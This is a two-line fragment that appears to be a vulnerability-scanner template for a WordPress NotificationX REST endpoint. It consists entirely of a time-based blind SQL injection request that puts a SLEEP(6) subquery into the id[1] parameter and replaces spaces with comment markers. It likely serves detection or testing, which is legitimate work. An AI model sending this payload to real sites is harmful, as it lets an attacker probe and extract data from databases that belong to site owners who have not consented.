# Vulnerable: ITS-1726
GET /wp-json/notificationx/v1/notification/1?api_key={{md5('{{apikey}}')}}&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6))
